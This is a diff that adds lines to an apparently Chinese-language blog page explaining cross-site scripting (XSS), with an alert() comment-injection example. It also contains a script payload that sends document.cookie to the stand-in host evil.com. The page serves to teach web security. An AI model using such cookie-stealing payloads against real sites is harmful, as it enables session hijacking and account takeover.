@@ -1115,6 +1115,9 @@
       
         
           <h5 id="全称-Cross-Site-Scripting-避免和CSS重名，所以简称XSS"><a href="#全称-Cross-Site-Scripting-避免和CSS重名，所以简称XSS" class="headerlink" title="全称 Cross Site Scripting (避免和CSS重名，所以简称XSS)"></a>全称 Cross Site Scripting (避免和CSS重名，所以简称XSS)</h5><ul>
+<li>跨站脚本攻击,指用户输入脚本并注入到了受害网站，如果该网站没有对用户输入进行过滤，那么这段脚本可能被之后访问该网站的用户浏览器执行。</li>
+<li>例1：某个网站有评论功能且没有针对XSS 的过滤，那么小编在某文章下评论了以下内容：<code>&lt;script&gt;alert(&quot;你查看了我的文章！！快打赏！！不打赏不准走！！&quot;)&lt;/script&gt;</code>那么这段字符串POST给了网站服务器，没有对脚本进行过滤或者Encode，原封不动地加入了原本的HTML页面，那么当其他用户查看该文章的时候浏览器就会自动执行HTML 文档中的这句 JS 脚本 </li>
+<li>例2：如果评论里面写的是： <code>&lt;script&gt;window.open(www.evil.com?content=document.cookie);&lt;/script&gt;</code>当你再次访问这篇文章的时候，你在当前域下的cookie被小编的恶意网站（<a href="http://www.evil.com）给get到了。。这个网站的后台程序可能会拿到你的cookie（其中包含sessionId" target="_blank" rel="noopener">www.evil.com）给get到了。。这个网站的后台程序可能会拿到你的cookie（其中包含sessionId</a> 等等），然后借此cookie登陆你的网站账户，乱发段子。当然，目前主流的网站都是禁止JS 脚本获取并且操作cookie的，并且浏览器中的安全机制使得cookie 不会被发送到跨域的其他网站中。</li>
 <li>利用<code>script</code>标签<ul>
 <li>获取页面数据偷取网站任意数据</li>
 <li>获取Cookies偷取用户资料</li>
